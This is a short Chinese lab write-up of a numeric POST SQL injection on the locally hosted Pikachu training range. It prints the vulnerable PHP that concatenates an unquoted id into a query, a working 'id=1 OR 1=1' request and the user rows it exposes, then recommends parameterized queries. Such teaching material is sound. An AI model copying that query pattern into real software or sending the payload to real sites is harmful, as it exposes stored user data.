Pikachu - SQL 注入 - 数字型注入

分类：Web / SQL Injection · 环境：本机 Pikachu 靶场 · 题目路径：SQL-Inject → 数字型注入（POST）

仅在自己部署的 127.0.0.1 靶场验证。

一、漏洞成因

请求体中的 id 未做类型校验就拼接到 SQL 中：

$id = $_POST['id'];
$query = "select username,email from member where id=$id";

因为参数没有被引号包裹，输入可以直接改变 WHERE 条件。

二、验证过程

POST /pikachu/vul/sqli/sqli_id.php
id=1 OR 1=1&submit=x

正常提交 id=1 只返回 vince；提交 1 OR 1=1 后返回 vince、allen、kobe、grady、kevin、lucy 等多条记录，说明永真条件已进入查询。

三、修复建议

使用参数化查询，并在业务层将 id 转换为整数。不要依赖前端下拉框限制输入。
